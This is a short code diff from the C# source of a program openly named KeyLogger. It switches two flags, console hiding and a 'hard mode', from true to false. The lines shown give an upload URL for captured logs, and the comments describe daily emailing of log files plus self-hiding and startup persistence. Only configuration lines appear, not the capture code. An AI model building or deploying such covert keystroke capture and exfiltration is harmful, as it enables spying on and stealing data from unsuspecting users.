@@ -4,7 +4,7 @@ namespace KeyLogger
 {
     class Program
     {
-        static bool HIDE_CONSOLE_WINDOW = true;
+        static bool HIDE_CONSOLE_WINDOW = false;
         // When the program starts, the console window will be hidden
 
         static string URL = @"https://ptsv2.com/t/kcecq-1587309669/post";
@@ -17,7 +17,7 @@ namespace KeyLogger
         // To prevent data loss and to organize data, the program once a day and 
         // at startup will send a log file to the specified email address.
 
-        static bool HARDMODE = true;
+        static bool HARDMODE = false;
         // At the first start, the program will hide itself at the specified 
         // address and will be added to startup.
 
